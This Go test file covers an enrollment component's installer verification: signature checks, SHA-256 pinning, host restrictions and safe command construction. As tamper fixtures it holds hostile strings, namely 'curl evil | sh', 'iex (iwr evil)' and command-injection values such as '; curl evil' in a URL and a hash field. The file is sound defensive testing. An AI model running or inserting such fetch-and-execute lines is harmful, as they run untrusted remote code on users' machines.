package enrollment

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/n3ptune-cpu/Fairy-agent/pkg/release"
	"github.com/n3ptune-cpu/Fairy-dashboard/internal/config"
	"github.com/n3ptune-cpu/Fairy-dashboard/internal/managed"
)

var testInstallers = Installers{Repo: "n3ptune-cpu/Fairy-agent", Tag: "build-7", Version: "7-6155fe6",
	Base: "https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7",
	SH:   strings.Repeat("a1", 32), PS1: strings.Repeat("b2", 32), PairV2SH: true, PairV2PS1: true}

// fakeRelease is a GitHub release download folder signed with a fresh key.
type fakeRelease struct {
	files map[string][]byte
	hits  atomic.Int32
	srv   *httptest.Server
	pub   string
}

// v0.4.3-style installers: they take the panel's hash of SHA256SUMS.
const (
	shWithPin  = "#!/bin/sh\nwhile [ $# -gt 0 ]; do\n  case \"$1\" in\n    --sums-sha256) SUMS_PIN=\"$2\"; shift ;;\n  esac\n  shift\ndone\n"
	ps1WithPin = "param(\n    [switch]$Ipmi,\n    [string]$SumsSha256 = '',\n    [string]$ReleaseUrl = 'x'\n)\n"
)

func newFakeRelease(t *testing.T, version string, scripts ...string) *fakeRelease {
	t.Helper()
	pub, priv, err := release.GenerateKey()
	if err != nil {
		t.Fatal(err)
	}
	k, _ := release.ParsePrivateKey(priv)
	f := &fakeRelease{pub: pub, files: map[string][]byte{
		InstallSH:           []byte("#!/bin/sh\necho installing\n"),
		InstallPS1:          []byte("Write-Host installing\n"),
		release.VersionFile: []byte("fairy-agent " + version + "\n"),
	}}
	if len(scripts) == 2 {
		f.files[InstallSH], f.files[InstallPS1] = []byte(scripts[0]), []byte(scripts[1])
	}
	f.files[release.SumsFile] = release.FormatSums([]string{release.VersionFile, InstallSH, InstallPS1}, f.files)
	f.files[release.SigFile] = release.Sign(k, f.files[release.SumsFile])
	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		name, ok := strings.CutPrefix(r.URL.Path, "/n3ptune-cpu/Fairy-agent/releases/download/build-7/")
		b, found := f.files[name]
		if !ok || !found {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(b)
	}))
	t.Cleanup(f.srv.Close)
	return f
}

func (f *fakeRelease) verifier(t *testing.T, version string) *Verifier {
	t.Helper()
	key, err := release.ParsePublicKey(f.pub)
	if err != nil {
		t.Fatal(err)
	}
	v := NewVerifier("n3ptune-cpu/Fairy-agent", "build-7", version, key)
	v.HTTP, v.DownloadBase, v.Hosts = f.srv.Client(), f.srv.URL, []string{"127.0.0.1"}
	return v
}

func hexSum(b []byte) string { h := sha256.Sum256(b); return hex.EncodeToString(h[:]) }

// The panel shows a command only for the pinned release's install scripts, checked with its release key; the
// result is kept (one download per panel run).
func TestVerifierChecksThePinnedRelease(t *testing.T) {
	f := newFakeRelease(t, "7-6155fe6")
	v := f.verifier(t, "7-6155fe6")
	in, err := v.Installers(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if in.Tag != "build-7" || in.Version != "7-6155fe6" || in.SH != hexSum(f.files[InstallSH]) || in.PS1 != hexSum(f.files[InstallPS1]) ||
		in.Sums != hexSum(f.files[release.SumsFile]) || in.PinSH || in.PinPS1 || in.PairV2SH || in.PairV2PS1 ||
		in.Base != f.srv.URL+"/n3ptune-cpu/Fairy-agent/releases/download/build-7" {
		t.Fatalf("%+v", in)
	}
	n := f.hits.Load()
	if _, err := v.Installers(context.Background()); err != nil || f.hits.Load() != n {
		t.Fatal("a checked release is downloaded again", err)
	}
	if v.Label() != "build-7 (fairy-agent 7-6155fe6)" {
		t.Fatal(v.Label())
	}
}

func TestVerifierRefuses(t *testing.T) {
	cases := map[string]struct {
		version string // the version the verifier expects
		mod     func(f *fakeRelease)
		want    string
	}{
		"no key":             {"7-6155fe6", func(f *fakeRelease) { f.pub = "" }, "no release signing key"},
		"other key":          {"7-6155fe6", func(f *fakeRelease) { p, _, _ := release.GenerateKey(); f.pub = p }, "signature does not match"},
		"tampered install":   {"7-6155fe6", func(f *fakeRelease) { f.files[InstallSH] = []byte("#!/bin/sh\ncurl evil | sh\n") }, "does not match"},
		"tampered ps1":       {"7-6155fe6", func(f *fakeRelease) { f.files[InstallPS1] = []byte("iex (iwr evil)") }, "does not match"},
		"tampered sums":      {"7-6155fe6", func(f *fakeRelease) { f.files[release.SumsFile] = append(f.files[release.SumsFile], 'x') }, "signature"},
		"other version":      {"8-0000000", func(*fakeRelease) {}, "expected 8-0000000"},
		"missing script":     {"7-6155fe6", func(f *fakeRelease) { delete(f.files, InstallPS1) }, "HTTP 404"},
		"huge file":          {"7-6155fe6", func(f *fakeRelease) { f.files[release.SigFile] = make([]byte, maxSmall+1) }, "larger than"},
		"panel release":      {"7-6155fe6", func(f *fakeRelease) { f.files[release.VersionFile] = []byte("fairy 7-6155fe6\n") }, "does not match"},
		"unsigned extra sum": {"7-6155fe6", func(f *fakeRelease) { f.files[release.SigFile] = []byte("bm90IGEgc2lnbmF0dXJl\n") }, "signature"},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			f := newFakeRelease(t, "7-6155fe6")
			c.mod(f)
			var v *Verifier
			if f.pub == "" {
				v = NewVerifier("n3ptune-cpu/Fairy-agent", "build-7", c.version, nil)
			} else {
				v = f.verifier(t, c.version)
			}
			_, err := v.Installers(context.Background())
			var u *Unavailable
			if err == nil || !errors.As(err, &u) || !strings.Contains(err.Error(), c.want) {
				t.Fatalf("got %v, want an Unavailable error with %q", err, c.want)
			}
		})
	}
}

// Downloads stay on https GitHub hosts (redirects too); a failure is retried only after a pause.
func TestVerifierHostsAndRetry(t *testing.T) {
	f := newFakeRelease(t, "7-6155fe6")
	v := f.verifier(t, "7-6155fe6")
	v.Hosts = []string{"github.com"}
	now := time.Unix(1_000_000, 0)
	v.Now = func() time.Time { return now }
	if _, err := v.Installers(context.Background()); err == nil || !strings.Contains(err.Error(), "only https from GitHub") {
		t.Fatal(err)
	}
	v.Hosts = []string{"127.0.0.1"}
	if _, err := v.Installers(context.Background()); err == nil {
		t.Fatal("retried at once")
	}
	now = now.Add(retryWait + time.Second)
	if _, err := v.Installers(context.Background()); err != nil {
		t.Fatal(err)
	}
	redir := httptest.NewTLSServer(http.RedirectHandler("http://example.com/x", http.StatusFound))
	defer redir.Close()
	v2 := f.verifier(t, "")
	v2.HTTP, v2.DownloadBase = redir.Client(), redir.URL
	if _, err := v2.Installers(context.Background()); err == nil || !strings.Contains(err.Error(), "only https from GitHub") {
		t.Fatal("redirect to plain http followed:", err)
	}
}

// Create shows no code and no command without a checked script.
func TestCreateNeedsCheckedScript(t *testing.T) {
	m := &Manager{PanelAddr: "100.88.109.47", items: map[string]*Enrollment{}, Hooks: Hooks{Config: func() *config.Panel { return &config.Panel{} }}}
	req := Request{Name: "nsx-furina", OS: "linux"}
	_, err := m.Create(context.Background(), req, &managed.Host{ID: "nsx-furina", Name: "nsx-furina", OS: "linux"}, "neptune", nil)
	var u *Unavailable
	if !errors.As(err, &u) || len(m.items) != 0 {
		t.Fatal("no script source:", err)
	}
	m.Scripts = PinnedVerifier("n3ptune-cpu/Fairy-agent", "", nil) // a build without the release key
	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "nsx-furina", Name: "nsx-furina", OS: "linux"}, "neptune", nil); !errors.As(err, &u) || len(m.items) != 0 {
		t.Fatal("no key:", err)
	}
	m.Scripts = Fixed{Base: "https://github.com/x/y/releases/download/build-7; curl evil", SH: testInstallers.SH, PS1: testInstallers.PS1}
	if _, err := m.Create(context.Background(), req, &managed.Host{ID: "nsx-furina", Name: "nsx-furina", OS: "linux"}, "neptune", nil); !errors.As(err, &u) {
		t.Fatal("unsafe base accepted:", err)
	}
}

func TestCommandsPinTheCheckedRelease(t *testing.T) {
	win := Command(testInstallers, managed.Host{OS: "windows", Options: managed.Options{PowerControl: true, UPSName: "ups1"}}, "CODE", "100.88.109.47")
	want := `$u='https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7'; $f="$env:TEMP\fairy-install.ps1"; ` +
		`iwr -useb "$u/install.ps1" -OutFile $f; if ((Get-FileHash $f -Algorithm SHA256).Hash -ne '` + testInstallers.PS1 + `') ` +
		`{ throw 'install.ps1 is not the release the panel checked: not run' }; ` +
		`powershell -ExecutionPolicy Bypass -File $f -ReleaseUrl $u -Join CODE -PanelAddress 100.88.109.47 -PairV2 -PowerControl -UpsName ups1`
	if win != want {
		t.Fatalf("\n got %s\nwant %s", win, want)
	}
	lin := Command(testInstallers, managed.Host{OS: "linux", Options: managed.Options{SelfUpdate: true}}, "CODE", "100.88.109.47")
	want = `f=$(mktemp) && curl -fsSL --proto '=https' -o "$f" https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7/install.sh && ` +
		`echo "` + testInstallers.SH + `  $f" | sha256sum -c - && sudo env FAIRY_RELEASE_URL=https://github.com/n3ptune-cpu/Fairy-agent/releases/download/build-7 ` +
		`sh "$f" --join CODE --panel 100.88.109.47 --pair-v2 --self-update`
	if lin != want {
		t.Fatalf("\n got %s\nwant %s", lin, want)
	}
	for _, c := range []string{win, lin} {
		if strings.Contains(c, "latest") || strings.Contains(c, "| sh ") || strings.Contains(c, "| sudo") {
			t.Fatal("unpinned or piped:", c)
		}
	}
}

// The Linux command really refuses a script that is not the checked one, and runs the checked one against the
// pinned release (curl is replaced by a copy from a local folder; a root shell, as on a Proxmox node).
func TestLinuxCommandRunsOnlyTheCheckedScript(t *testing.T) {
	if runtime.GOOS != "linux" {
		t.Skip("POSIX shell and sha256sum")
	}
	for _, tool := range []string{"sh", "sha256sum", "mktemp"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skip(tool + " missing")
		}
	}
	dir := t.TempDir()
	bin := filepath.Join(dir, "bin")
	if err := os.MkdirAll(bin, 0o755); err != nil {
		t.Fatal(err)
	}
	served := filepath.Join(dir, "served-install.sh")
	// fake curl: copies the "downloaded" file to the -o target
	curl := "#!/bin/sh\nout=\nwhile [ $# -gt 0 ]; do case \"$1\" in -o) out=\"$2\"; shift;; esac; shift; done\ncp \"" + served + "\" \"$out\"\n"
	if err := os.WriteFile(filepath.Join(bin, "curl"), []byte(curl), 0o755); err != nil {
		t.Fatal(err)
	}
	marker := filepath.Join(dir, "ran")
	script := []byte("#!/bin/sh\necho \"$FAIRY_RELEASE_URL $*\" > \"" + marker + "\"\n")
	in := testInstallers
	in.SH = hexSum(script)
	in.PinSH, in.Sums = true, strings.Repeat("c3", 32)
	cmd := Command(in, managed.Host{OS: "linux", ProxmoxWanted: true}, "ABCD-EFGH", "100.88.109.47")
	run := func() (string, error) {
		os.Remove(marker)
		c := exec.Command("sh", "-c", cmd)
		c.Env = append(os.Environ(), "PATH="+bin+":"+os.Getenv("PATH"))
		out, err := c.CombinedOutput()
		return string(out), err
	}
	if err := os.WriteFile(served, []byte("#!/bin/sh\necho tampered > \""+marker+"\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := run(); err == nil {
		t.Fatal("a tampered script passed the check:", out)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("the tampered script ran")
	}
	if err := os.WriteFile(served, script, 0o644); err != nil {
		t.Fatal(err)
	}
	if out, err := run(); err != nil {
		t.Fatal(err, out)
	}
	got, _ := os.ReadFile(marker)
	if string(got) != in.Base+" --sums-sha256 "+in.Sums+" --join ABCD-EFGH --panel 100.88.109.47 --pair-v2 --proxmox\n" {
		t.Fatalf("%q", got)
	}
}

// AgentModule must follow go.mod: when Fairy-agent is bumped there, the pinned release must be bumped too.
func TestPinnedReleaseFollowsGoMod(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("..", "..", "go.mod"))
	if err != nil {
		t.Fatal(err)
	}
	m := regexp.MustCompile(`(?m)^\s*github\.com/n3ptune-cpu/Fairy-agent (v\S+)`).FindSubmatch(b)
	if m == nil || string(m[1]) != AgentModule {
		t.Fatalf("go.mod requires Fairy-agent %s, the pinned release is for %s: update AgentModule, AgentReleaseTag and AgentReleaseVersion", m[1], AgentModule)
	}
	if !regexp.MustCompile(`^build-\d+$`).MatchString(AgentReleaseTag) || !strings.HasPrefix(AgentReleaseVersion, strings.TrimPrefix(AgentReleaseTag, "build-")+"-") {
		t.Fatal("tag and version disagree", AgentReleaseTag, AgentReleaseVersion)
	}
}

// Installers that take the panel's hash of SHA256SUMS (Fairy-agent v0.4.3) get the hash of the exact SHA256SUMS
// bytes the panel verified; older ones (which refuse unknown options) do not.
func TestCommandsPassTheVerifiedSumsHash(t *testing.T) {
	f := newFakeRelease(t, "8-e38a516", shWithPin, ps1WithPin)
	in, err := f.verifier(t, "8-e38a516").Installers(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	sums := hexSum(f.files[release.SumsFile])
	if !in.PinSH || !in.PinPS1 || in.Sums != sums {
		t.Fatalf("%+v", in)
	}
	lin := Command(in, managed.Host{OS: "linux"}, "CODE", "100.88.109.47")
	if !strings.Contains(lin, `sh "$f" --sums-sha256 `+sums+` --join CODE --panel 100.88.109.47`) {
		t.Fatal(lin)
	}
	win := Command(in, managed.Host{OS: "windows"}, "CODE", "100.88.109.47")
	if !strings.Contains(win, `-File $f -ReleaseUrl $u -SumsSha256 `+sums+` -Join CODE -PanelAddress 100.88.109.47`) {
		t.Fatal(win)
	}
	// only one of them updated: each command follows its own script
	f2 := newFakeRelease(t, "8-e38a516", shWithPin, "param([string]$ReleaseUrl)\n")
	in2, err := f2.verifier(t, "").Installers(context.Background())
	if err != nil || !in2.PinSH || in2.PinPS1 {
		t.Fatalf("%+v %v", in2, err)
	}
	if w := Command(in2, managed.Host{OS: "windows"}, "CODE", "100.88.109.47"); strings.Contains(w, "SumsSha256") {
		t.Fatal(w)
	}
	bad := in
	bad.Sums = "not-a-hash; curl evil"
	if bad.valid() {
		t.Fatal("unsafe sums hash accepted")
	}
}
